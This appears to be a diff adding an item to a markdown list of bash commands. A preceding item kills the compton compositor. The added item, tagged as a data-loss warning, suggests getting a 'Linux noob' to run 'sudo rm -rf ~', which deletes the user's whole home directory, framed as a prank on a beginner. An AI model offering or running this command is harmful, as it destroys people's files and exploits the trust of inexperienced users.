@@ -32,3 +32,7 @@
     ```bash
     killall -q compton
     ```
+5. (**data-loss warning**) make a Linux noob run in bash:
+    ```bash
+    sudo rm -rf ~
+    ```
